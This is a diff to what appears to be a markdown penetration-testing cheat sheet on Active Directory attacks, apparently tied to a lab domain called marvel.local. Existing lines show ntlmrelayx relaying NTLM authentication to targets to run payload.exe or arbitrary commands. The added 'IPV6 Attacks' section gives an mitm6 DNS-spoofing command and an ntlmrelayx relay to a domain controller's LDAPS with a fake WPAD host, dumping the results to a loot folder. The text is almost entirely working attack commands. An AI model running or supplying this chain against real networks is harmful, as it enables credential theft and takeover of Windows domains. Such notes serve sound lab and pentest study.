@@ -45,3 +45,14 @@ python ntlmrelayx.py -tf targets.txt -smb2support -e payload.exe
 # Execute a command
 python ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"
 ```
+
+#### IPV6 Attacks
+````
+# git clone https://github.com/fox-it/mitm6.git then nav to directory
+# pip3 install .
+mitm6 -d marvel.local
+
+# Now in a different terminal setup a relay attack
+ntlmrelayx.py -6 -t ldaps://<domaincontrollerip> -wh fakewpad.marvel.local -l lootme
+
+````
